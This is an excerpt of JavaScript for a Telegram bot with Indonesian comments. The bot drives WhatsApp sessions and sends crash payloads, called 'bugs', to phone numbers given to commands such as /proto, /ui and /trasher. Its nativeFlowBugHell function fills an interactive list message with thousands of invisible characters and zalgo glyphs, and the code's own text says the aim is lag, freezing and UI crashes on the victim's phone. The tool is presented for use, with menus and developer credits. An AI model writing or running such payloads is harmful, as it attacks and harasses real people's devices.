...
async function nativeFlowBugHell(conn, jid) {
  try {
    const INV = String.fromCharCode(8206); // Left-to-right invisible
    const ZWSP = String.fromCharCode(8203); // Zero-width space
    const ZALGO = '҉'.repeat(1000); // Zalgo glitch
    const GLITCH = "𓆩𒆜💀𓆩𒆜💀𓆩𒆜💀𓆩𒆜💀𓆩𒆜💀";

    // Generate brutal rows
    const rows = [];
    for (let i = 0; i < 200; i++) {
      rows.push({
        header: ZALGO,
        title: INV.repeat(800) + "💣" + GLITCH + "💀" + INV.repeat(800),
        description: ZWSP.repeat(300) + GLITCH.repeat(2),
        id: `HELL_${i}_${Math.random().toString(36).substring(2)}`
      });
    }

    // Section yang overload
    const sections = [];
    for (let i = 0; i < 5; i++) {
      sections.push({
        title: GLITCH + INV.repeat(1500),
        rows: rows.slice(i * 40, (i + 1) * 40)
      });
    }

    // Compile ke dalam native flow format
    const listMessage = {
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        title: INV.repeat(6000) + ZALGO + GLITCH + INV.repeat(2000),
        sections: sections
      })
    };
    ...
    await conn.sendMessage(jid, {
      text: INV.repeat(3000) + "☠️", // kosong tapi berat
      interactiveMessage: listMessage
    });

    // Kirim notifikasi bahwa bug extreme telah dikirim
    await conn.sendMessage(jid, {
      text: "*☣️ BUG NATIVE FLOW HELL MODE TERKIRIM ✅*\nEfek: Lag, Freeze, UI Crash (Tergantung HP).",
    });

  } catch (e) {
    console.error("❌ Gagal kirim BUG HELL:", e);
    await conn.sendMessage(jid, {
      text: "*❌ Gagal mengirim BUG NATIVE FLOW HELL*",
    });
  }
}
    ...
    reply_markup: {
      inline_keyboard: [
        [
          ...
          { text: "「 𝐎𝐖𝐍𝐄𝐑」", callback_data: "owner" },
        ],
      ],
    },
  });
...
//ganti caption dibawah sesuai kebutuhan 
  if (data === "bug_menu") {
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/qp2uhp.png", {
        caption: `
\`\`\`
╭━━━⭓「 𝐢𝐌𝐀𝐓𝐢𝐎𝐍 ☇ 」
...
//ganti caption dibawah sesuai kebutuhan 
    bot.deleteMessage(chatId, callbackQuery.message.message_id).then(() => {
      bot.sendPhoto(chatId, "https://files.catbox.moe/ojffkm.jpg", {
        caption: `
\`\`\`
╔─═─═⪩「 𝐀͢𝐊͡𝐒𝐄͜⍣᷼𝐒͠ 」
...
║ ┃┗┫┏┓┃┏┓┃┃┣━━┃
║ ┗━┻┛┗┻┛┗┻━┻━━┛
║ 𝐁𝐚𝐲𝐳 (𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐕𝐨𝐧𝐳𝐢𝐞) 
║ 𝐃𝐢𝐧𝐳 (𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐓𝐫𝐚𝐯𝐞𝐫𝐗) 
║ 𝐀𝐛𝐝𝐮𝐥𝐳 (𝐆𝐤 𝐭𝐚𝐮 𝐀𝐡 𝐌𝐚𝐥𝐞𝐬) 
║ 𝐑𝐢𝐢 (𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐄𝐯𝐨𝐮𝐫𝐭𝐡) 
║ ┗─⊱
╚─═─═─═─═─═─═─═⪩
\`\`\`
`,
...
\`\`\``,
    ...
    for (const [botNum, sock] of sessions.entries()) {
      try {
        await nativeFlowBugHell(sock, jid);
        successCount++;
      } catch (err) {
...
bot.onText(/\/proto(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();
  ...
  try {
    ...
    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /proto 62xxx", { parse_mode: "Markdown" });
    }
...
\`\`\``,
    ...
    console.error("PROTO ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});


bot.onText(/\/ui(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();
  ...
  try {
    ...
    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /ui 62xxx", { parse_mode: "Markdown" });
    }
...
bot.onText(/\/trasher(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();
  ...
  try {
    ...
    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /trasher 62xxx", { parse_mode: "Markdown" });
    }
